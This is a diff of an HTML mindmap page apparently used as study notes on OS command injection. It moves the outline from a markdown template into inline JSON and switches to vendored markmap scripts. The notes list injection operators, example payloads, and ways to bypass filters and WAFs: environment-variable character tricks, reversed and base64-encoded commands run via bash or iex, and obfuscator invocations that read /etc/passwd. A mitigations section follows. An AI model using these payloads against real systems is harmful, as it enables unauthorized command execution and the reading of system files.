@@ -4,127 +4,39 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Command Injections — Mindmap</title>
+<link rel="stylesheet" href="../../../vendor/markmap/markmap-toolbar.css" />
 <style>
   :root { color-scheme: light dark; }
   html, body { margin: 0; height: 100%; }
   body { background: #faf8f8; }
   @media (prefers-color-scheme: dark) { body { background: #1e1e21; } }
-  svg.markmap { width: 100%; height: 100vh; display: block; }
+  #mindmap { width: 100%; height: 100vh; display: block; }
+  .mm-toolbar { position: absolute; bottom: 0.75rem; right: 0.75rem; }
 </style>
-<script>
-  window.markmap = {
-    autoLoader: {
-      toolbar: true,
-      options: { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
-    },
-  }
-</script>
-<script async src="https://cdn.jsdelivr.net/npm/markmap-autoloader@0.18.12"></script>
+<script src="../../../vendor/markmap/d3.min.js"></script>
+<script src="../../../vendor/markmap/markmap-view.js"></script>
+<script src="../../../vendor/markmap/markmap-toolbar.js"></script>
 </head>
 <body>
-  <div class="markmap">
-    <script type="text/template">
-# Command Injections
-## 🎯 Main Idea
-- Exploit web apps that pass unsanitized user input into OS command execution functions.
-- Goal: inject and execute arbitrary system commands on the back-end server (RCE).
-- Covers detection, injection operators, and bypassing character/command filters & WAFs.
-- Applies regardless of language/framework (PHP, NodeJS, .NET) or OS (Linux/Windows).
-
-## 💥 Attack / Exploit Vectors
-
-### Detection
-- Find input used in a system command (e.g. `ping -c 1 OUR_INPUT`); append a command and watch output change.
-- Vulnerable functions: PHP `exec/system/shell_exec/passthru/popen`, NodeJS `child_process.exec/spawn`.
-
-### Injection Operators
-- Append a second command using shell operators; front-end validation is bypassed via Burp/ZAP + URL-encode (`[CTRL+U]`).
-- **Commands**
-  - `;` (`%3b`) — semicolon, both run (not in Windows CMD)
-  - `\n` (`%0a`) — new line, both run (often not blacklisted)
-  - `&` (`%26`) — background, both run
-  - `|` (`%7c`) — pipe, only second output shown
-  - `&&` (`%26%26`) — AND, second runs only if first succeeds
-  - `||` (`%7c%7c`) — OR, second runs only if first fails
-  - `` `` `` (`%60%60`) — sub-shell (Linux only)
-  - `$()` (`%24%28%29`) — sub-shell (Linux only)
-  - `127.0.0.1; whoami` — example payload
-
-### Identifying Filters
-- Reduce payload one character at a time to find what triggers "Invalid input".
-- App-level block (inline error) vs WAF block (different page w/ IP/request details).
-
-### Bypassing Space Filters
-- **Commands**
-  - `%09` — tab instead of space
-  - `${IFS}` — Linux env var = space/tab (not usable inside `$()`)
-  - `{ls,-la}` — Bash brace expansion (commas become spaces)
-
-### Bypassing Blacklisted Characters (Linux)
-- Produce needed chars from env-var substrings without typing them.
-- **Commands**
-  - `${PATH:0:1}` — yields `/`
-  - `${LS_COLORS:10:1}` — yields `;`
-  - `printenv` — list env vars to find useful characters
-  - `$(tr '!-}' '"-~'<<<[)` — character shift (`[` → `\`), use `man ascii` to pick char
-
-### Bypassing Blacklisted Characters (Windows)
-- **Commands**
-  - `%HOMEPATH:~6,-11%` — yields `\` (CMD)
-  - `$env:HOMEPATH[0]` — yields `\` (PowerShell)
-  - `%PROGRAMFILES:~10,-5%` — yields space (CMD)
-  - `$env:PROGRAMFILES[10]` — yields space (PowerShell)
-  - `Get-ChildItem Env:` — list env vars (PowerShell)
-
-### Bypassing Blacklisted Commands (Character Insertion)
-- Insert shell-ignored chars into command words to evade exact-match blacklist.
-- **Commands**
-  - `w'h'o'am'i` / `w"h"o"am"i` — quotes (even count, don't mix); Linux & Windows
-  - `who$@ami` — positional param `$@` (Linux only, any count)
-  - `w\ho\am\i` — backslash (Linux only)
-  - `who^ami` — caret `^` (Windows CMD only)
-
-### Advanced Obfuscation — Case Manipulation
-- **Commands**
-  - `WhOaMi` — Windows case-insensitive, send as-is
-  - `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — force lowercase on Linux
-  - `$(a="WhOaMi";printf %s "${a,,}")` — variant lowercase technique
-
-### Advanced Obfuscation — Reversed Commands
-- **Commands**
-  - `echo 'whoami' | rev` — reverse string (Linux)
-  - `$(rev<<<'imaohw')` — execute reversed (Linux)
-  - `"whoami"[-1..-20] -join ''` — reverse string (Windows)
-  - `iex "$('imaohw'[-1..-20] -join '')"` — execute reversed (Windows)
-
-### Advanced Obfuscation — Encoded Commands
-- Encode payload (avoids filtered chars / URL-decode issues), decode & exec in sub-shell.
-- **Commands**
-  - `echo -n 'cat /etc/passwd | grep 33' | base64` — base64 encode (Linux)
-  - `bash<<<$(base64 -d<<<Y2F0...Mw==)` — decode & exec (uses `<<<` to avoid pipe)
-  - `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` — encode (Windows)
-  - `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` — utf-16 encode on Linux for Windows
-  - `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` — decode & exec (Windows)
-
-### Evasion Tools
-- Automated obfuscation when manual bypasses fail against WAFs.
-- **Commands**
-  - `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` — Linux Bashfuscator (short output)
-  - `Import-Module .\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation` — Windows DOSfuscation (interactive; BINARY/ENCODING/PAYLOAD)
-
-## 🛠️ Key Tools & Concepts
-- Burp Suite / ZAP — intercept & modify requests to bypass front-end validation
-- Firefox Dev Tools (`[CTRL+SHIFT+E]`) — confirm validation is front-end only
-- Bashfuscator (Linux) / Invoke-DOSfuscation (Windows) — automated obfuscation
-- PayloadsAllTheThings — command injection bypass references
-- Injection types overview: SQL, LDAP, XPath, Code, Header, etc.
-
-## 🛡️ Mitigations
-- Avoid system-command functions; use built-in equivalents (e.g. PHP `fsockopen` to check a host).
-- Validate input on front-end AND back-end (`filter_var` w/ `FILTER_VALIDATE_IP`, regex `preg_match`, is-ip).
-- Sanitize input: whitelist allowed chars with `preg_replace('/[^A-Za-z0-9.]/','',...)`, DOMPurify; escaping (escapeshellcmd) is weak/bypassable.
-- Server config: mod_security + external WAF, run as low-priv user (www-data), PHP `disable_functions`, `open_basedir`, reject double-encoded/non-ASCII, avoid outdated modules (PHP CGI).
-    </script>
-  </div>
+  <svg id="mindmap"></svg>
+  <script>
+    const data = {"content":"Command Injections","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"Exploit web apps that pass unsanitized user input into OS command execution functions.","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Goal: inject and execute arbitrary system commands on the back-end server (RCE).","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"Covers detection, injection operators, and bypassing character/command filters &amp; WAFs.","children":[],"payload":{"tag":"li","lines":"4,5"}},{"content":"Applies regardless of language/framework (PHP, NodeJS, .NET) or OS (Linux/Windows).","children":[],"payload":{"tag":"li","lines":"5,7"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Detection","children":[{"content":"Find input used in a system command (e.g. <code>ping -c 1 OUR_INPUT<\/code>); append a command and watch output change.","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"Vulnerable functions: PHP <code>exec/system/shell_exec/passthru/popen<\/code>, NodeJS <code>child_process.exec/spawn<\/code>.","children":[],"payload":{"tag":"li","lines":"11,13"}}],"payload":{"tag":"h3","lines":"9,10"}},{"content":"Injection Operators","children":[{"content":"Append a second command using shell operators; front-end validation is bypassed via Burp/ZAP + URL-encode (<code>[CTRL+U]<\/code>).","children":[],"payload":{"tag":"li","lines":"14,15"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>;<\/code> (<code>%3b<\/code>) &#x2014; semicolon, both run (not in Windows CMD)","children":[],"payload":{"tag":"li","lines":"16,17"}},{"content":"<code>\\n<\/code> (<code>%0a<\/code>) &#x2014; new line, both run (often not blacklisted)","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<code>&amp;<\/code> (<code>%26<\/code>) &#x2014; background, both run","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<code>|<\/code> (<code>%7c<\/code>) &#x2014; pipe, only second output shown","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<code>&amp;&amp;<\/code> (<code>%26%26<\/code>) &#x2014; AND, second runs only if first succeeds","children":[],"payload":{"tag":"li","lines":"20,21"}},{"content":"<code>||<\/code> (<code>%7c%7c<\/code>) &#x2014; OR, second runs only if first fails","children":[],"payload":{"tag":"li","lines":"21,22"}},{"content":"<code> <\/code> `` (<code>%60%60<\/code>) &#x2014; sub-shell (Linux only)","children":[],"payload":{"tag":"li","lines":"22,23"}},{"content":"<code>&#x24;()<\/code> (<code>%24%28%29<\/code>) &#x2014; sub-shell (Linux only)","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<code>127.0.0.1; whoami<\/code> &#x2014; example payload","children":[],"payload":{"tag":"li","lines":"24,26"}}],"payload":{"tag":"li","lines":"15,26"}}],"payload":{"tag":"h3","lines":"13,14"}},{"content":"Identifying Filters","children":[{"content":"Reduce payload one character at a time to find what triggers &quot;Invalid input&quot;.","children":[],"payload":{"tag":"li","lines":"27,28"}},{"content":"App-level block (inline error) vs WAF block (different page w/ IP/request details).","children":[],"payload":{"tag":"li","lines":"28,30"}}],"payload":{"tag":"h3","lines":"26,27"}},{"content":"Bypassing Space Filters","children":[{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>%09<\/code> &#x2014; tab instead of space","children":[],"payload":{"tag":"li","lines":"32,33"}},{"content":"<code>&#x24;{IFS}<\/code> &#x2014; Linux env var = space/tab (not usable inside <code>&#x24;()<\/code>)","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<code>{ls,-la}<\/code> &#x2014; Bash brace expansion (commas become spaces)","children":[],"payload":{"tag":"li","lines":"34,36"}}],"payload":{"tag":"li","lines":"31,36"}}],"payload":{"tag":"h3","lines":"30,31"}},{"content":"Bypassing Blacklisted Characters (Linux)","children":[{"content":"Produce needed chars from env-var substrings without typing them.","children":[],"payload":{"tag":"li","lines":"37,38"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&#x24;{PATH:0:1}<\/code> &#x2014; yields <code>/<\/code>","children":[],"payload":{"tag":"li","lines":"39,40"}},{"content":"<code>&#x24;{LS_COLORS:10:1}<\/code> &#x2014; yields <code>;<\/code>","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"<code>printenv<\/code> &#x2014; list env vars to find useful characters","children":[],"payload":{"tag":"li","lines":"41,42"}},{"content":"<code>&#x24;(tr &apos;!-}&apos; &apos;&quot;-~&apos;&lt;&lt;&lt;[)<\/code> &#x2014; character shift (<code>[<\/code> &#x2192; <code>\\<\/code>), use <code>man ascii<\/code> to pick char","children":[],"payload":{"tag":"li","lines":"42,44"}}],"payload":{"tag":"li","lines":"38,44"}}],"payload":{"tag":"h3","lines":"36,37"}},{"content":"Bypassing Blacklisted Characters (Windows)","children":[{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>%HOMEPATH:~6,-11%<\/code> &#x2014; yields <code>\\<\/code> (CMD)","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"<code>&#x24;env:HOMEPATH[0]<\/code> &#x2014; yields <code>\\<\/code> (PowerShell)","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"<code>%PROGRAMFILES:~10,-5%<\/code> &#x2014; yields space (CMD)","children":[],"payload":{"tag":"li","lines":"48,49"}},{"content":"<code>&#x24;env:PROGRAMFILES[10]<\/code> &#x2014; yields space (PowerShell)","children":[],"payload":{"tag":"li","lines":"49,50"}},{"content":"<code>Get-ChildItem Env:<\/code> &#x2014; list env vars (PowerShell)","children":[],"payload":{"tag":"li","lines":"50,52"}}],"payload":{"tag":"li","lines":"45,52"}}],"payload":{"tag":"h3","lines":"44,45"}},{"content":"Bypassing Blacklisted Commands (Character Insertion)","children":[{"content":"Insert shell-ignored chars into command words to evade exact-match blacklist.","children":[],"payload":{"tag":"li","lines":"53,54"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>w&apos;h&apos;o&apos;am&apos;i<\/code> / <code>w&quot;h&quot;o&quot;am&quot;i<\/code> &#x2014; quotes (even count, don&apos;t mix); Linux &amp; Windows","children":[],"payload":{"tag":"li","lines":"55,56"}},{"content":"<code>who&#x24;@ami<\/code> &#x2014; positional param <code>&#x24;@<\/code> (Linux only, any count)","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"<code>w\\ho\\am\\i<\/code> &#x2014; backslash (Linux only)","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"<code>who^ami<\/code> &#x2014; caret <code>^<\/code> (Windows CMD only)","children":[],"payload":{"tag":"li","lines":"58,60"}}],"payload":{"tag":"li","lines":"54,60"}}],"payload":{"tag":"h3","lines":"52,53"}},{"content":"Advanced Obfuscation &#x2014; Case Manipulation","children":[{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>WhOaMi<\/code> &#x2014; Windows case-insensitive, send as-is","children":[],"payload":{"tag":"li","lines":"62,63"}},{"content":"<code>&#x24;(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)<\/code> &#x2014; force lowercase on Linux","children":[],"payload":{"tag":"li","lines":"63,64"}},{"content":"<code>&#x24;(a=&quot;WhOaMi&quot;;printf %s &quot;&#x24;{a,,}&quot;)<\/code> &#x2014; variant lowercase technique","children":[],"payload":{"tag":"li","lines":"64,66"}}],"payload":{"tag":"li","lines":"61,66"}}],"payload":{"tag":"h3","lines":"60,61"}},{"content":"Advanced Obfuscation &#x2014; Reversed Commands","children":[{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>echo &apos;whoami&apos; | rev<\/code> &#x2014; reverse string (Linux)","children":[],"payload":{"tag":"li","lines":"68,69"}},{"content":"<code>&#x24;(rev&lt;&lt;&lt;&apos;imaohw&apos;)<\/code> &#x2014; execute reversed (Linux)","children":[],"payload":{"tag":"li","lines":"69,70"}},{"content":"<code>&quot;whoami&quot;[-1..-20] -join &apos;&apos;<\/code> &#x2014; reverse string (Windows)","children":[],"payload":{"tag":"li","lines":"70,71"}},{"content":"<code>iex &quot;&#x24;(&apos;imaohw&apos;[-1..-20] -join &apos;&apos;)&quot;<\/code> &#x2014; execute reversed (Windows)","children":[],"payload":{"tag":"li","lines":"71,73"}}],"payload":{"tag":"li","lines":"67,73"}}],"payload":{"tag":"h3","lines":"66,67"}},{"content":"Advanced Obfuscation &#x2014; Encoded Commands","children":[{"content":"Encode payload (avoids filtered chars / URL-decode issues), decode &amp; exec in sub-shell.","children":[],"payload":{"tag":"li","lines":"74,75"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>echo -n &apos;cat /etc/passwd | grep 33&apos; | base64<\/code> &#x2014; base64 encode (Linux)","children":[],"payload":{"tag":"li","lines":"76,77"}},{"content":"<code>bash&lt;&lt;&lt;&#x24;(base64 -d&lt;&lt;&lt;Y2F0...Mw==)<\/code> &#x2014; decode &amp; exec (uses <code>&lt;&lt;&lt;<\/code> to avoid pipe)","children":[],"payload":{"tag":"li","lines":"77,78"}},{"content":"<code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&apos;whoami&apos;))<\/code> &#x2014; encode (Windows)","children":[],"payload":{"tag":"li","lines":"78,79"}},{"content":"<code>echo -n whoami | iconv -f utf-8 -t utf-16le | base64<\/code> &#x2014; utf-16 encode on Linux for Windows","children":[],"payload":{"tag":"li","lines":"79,80"}},{"content":"<code>iex &quot;&#x24;([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&apos;dwBoAG8AYQBtAGkA&apos;)))&quot;<\/code> &#x2014; decode &amp; exec (Windows)","children":[],"payload":{"tag":"li","lines":"80,82"}}],"payload":{"tag":"li","lines":"75,82"}}],"payload":{"tag":"h3","lines":"73,74"}},{"content":"Evasion Tools","children":[{"content":"Automated obfuscation when manual bypasses fail against WAFs.","children":[],"payload":{"tag":"li","lines":"83,84"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>./bashfuscator -c &apos;cat /etc/passwd&apos; -s 1 -t 1 --no-mangling --layers 1<\/code> &#x2014; Linux Bashfuscator (short output)","children":[],"payload":{"tag":"li","lines":"85,86"}},{"content":"<code>Import-Module .\\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation<\/code> &#x2014; Windows DOSfuscation (interactive; BINARY/ENCODING/PAYLOAD)","children":[],"payload":{"tag":"li","lines":"86,88"}}],"payload":{"tag":"li","lines":"84,88"}}],"payload":{"tag":"h3","lines":"82,83"}}],"payload":{"tag":"h2","lines":"7,8"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"Burp Suite / ZAP &#x2014; intercept &amp; modify requests to bypass front-end validation","children":[],"payload":{"tag":"li","lines":"89,90"}},{"content":"Firefox Dev Tools (<code>[CTRL+SHIFT+E]<\/code>) &#x2014; confirm validation is front-end only","children":[],"payload":{"tag":"li","lines":"90,91"}},{"content":"Bashfuscator (Linux) / Invoke-DOSfuscation (Windows) &#x2014; automated obfuscation","children":[],"payload":{"tag":"li","lines":"91,92"}},{"content":"PayloadsAllTheThings &#x2014; command injection bypass references","children":[],"payload":{"tag":"li","lines":"92,93"}},{"content":"Injection types overview: SQL, LDAP, XPath, Code, Header, etc.","children":[],"payload":{"tag":"li","lines":"93,95"}}],"payload":{"tag":"h2","lines":"88,89"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Avoid system-command functions; use built-in equivalents (e.g. PHP <code>fsockopen<\/code> to check a host).","children":[],"payload":{"tag":"li","lines":"96,97"}},{"content":"Validate input on front-end AND back-end (<code>filter_var<\/code> w/ <code>FILTER_VALIDATE_IP<\/code>, regex <code>preg_match<\/code>, is-ip).","children":[],"payload":{"tag":"li","lines":"97,98"}},{"content":"Sanitize input: whitelist allowed chars with <code>preg_replace(&apos;/[^A-Za-z0-9.]/&apos;,&apos;&apos;,...)<\/code>, DOMPurify; escaping (escapeshellcmd) is weak/bypassable.","children":[],"payload":{"tag":"li","lines":"98,99"}},{"content":"Server config: mod_security + external WAF, run as low-priv user (www-data), PHP <code>disable_functions<\/code>, <code>open_basedir<\/code>, reject double-encoded/non-ASCII, avoid outdated modules (PHP CGI).","children":[],"payload":{"tag":"li","lines":"99,100"}}],"payload":{"tag":"h2","lines":"95,96"}}],"payload":{"tag":"h1","lines":"0,1"}}
+    const { Markmap, Toolbar, globalCSS } = window.markmap
+    if (globalCSS) {
+      const s = document.createElement("style")
+      s.textContent = globalCSS
+      document.head.appendChild(s)
+    }
+    const mm = Markmap.create(
+      "#mindmap",
+      { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
+      data,
+    )
+    try {
+      const { el } = Toolbar.create(mm)
+      el.classList.add("mm-toolbar")
+      document.body.appendChild(el)
+    } catch (e) {}
+  </script>
 </body>
 </html>
